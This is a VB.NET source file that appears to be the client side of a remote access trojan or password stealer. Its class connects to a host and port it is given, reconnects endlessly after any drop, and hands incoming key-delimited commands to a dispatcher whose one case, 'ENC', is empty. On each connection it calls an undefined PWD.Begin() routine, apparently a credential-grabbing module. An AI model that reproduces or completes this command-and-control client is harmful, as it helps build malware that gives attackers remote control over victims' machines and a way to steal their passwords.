Imports System.Net.Sockets
Public Class Main



    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String)

        KEY = K
        Dim M As New IO.MemoryStream ' create memory stream
        Dim lp As Integer = 0

e:      ' clear things and ReConnect
        CN = False
        Try
            C.Client.Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            M.Dispose()
        Catch ex As Exception
        End Try
        M = New IO.MemoryStream
        Try
            C = New Net.Sockets.TcpClient
            C.ReceiveTimeout = -1
            C.SendTimeout = -1
            C.SendBufferSize = 999999
            C.ReceiveBufferSize = 999999
            C.Client.SendBufferSize = 999999
            C.Client.ReceiveBufferSize = 999999
            lp = 0
            C.Client.Connect(H, P)
            CN = True
            PWD.Begin()
        Catch ex As Exception
        End Try
        GoTo re
re:
        Try
            If C Is Nothing Then GoTo cc
            If C.Client.Connected = False Then GoTo cc
            If CN = False Then GoTo cc
            lp += 1
            If lp > 500 Then
                lp = 0
                ' check if i am still connected
                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo e
            End If
            If C.Available > 0 Then
                Dim B(C.Available - 1) As Byte
                C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                M.Write(B, 0, B.Length)
rr:
                If BS(M.ToArray).Contains(K) Then ' split packet..
                    Dim A As Array = fx(M.ToArray, K)
                    Dim T As New Threading.Thread(AddressOf Data)
                    T.Start(A(0))
                    M.Dispose()
                    M = New IO.MemoryStream
                    If A.Length = 2 Then
                        M.Write(A(1), 0, A(1).length)
                        GoTo rr
                    End If
                End If
            End If
        Catch ex As Exception
            GoTo e
        End Try
        Threading.Thread.CurrentThread.Sleep(1)
        GoTo re

cc:
        Try
            C.Close()
            C = Nothing
        Catch ex As Exception
        End Try
    End Sub



    Public Shared Sub Data(ByVal b As Byte())
        Dim A As String() = Split(BS(b), SPL)

        Try

            Select Case A(0)
                Case "ENC"

            End Select

        Catch ex As Exception
        End Try

    End Sub



    Public Shared Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
        Dim a As New Collections.Generic.List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function


    Public Shared Sub Send(ByVal b As Byte())
        If CN = False Then Exit Sub
        Try
            Dim r As Object = New IO.MemoryStream
            r.Write(b, 0, b.Length)
            r.Write(SB(KEY), 0, KEY.Length)
            C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
            r.Dispose()
        Catch ex As Exception
            CN = False
        End Try
    End Sub
    Public Shared Sub Send(ByVal S As String)
        Send(SB(S))
    End Sub
    Public Shared CN As Boolean = False

    Public Shared Function SB(ByVal s As String) As Byte() ' string to byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function

    Public Shared Function BS(ByVal b As Byte()) As String ' byte() to string
        Return System.Text.Encoding.Default.GetString(b)
    End Function



    Public Shared C As TcpClient = Nothing
    Public Shared KEY As String = String.Empty
    Public Shared _H
    Public Shared _P
    Public Shared SPL As String = "|'L'|"

End Class
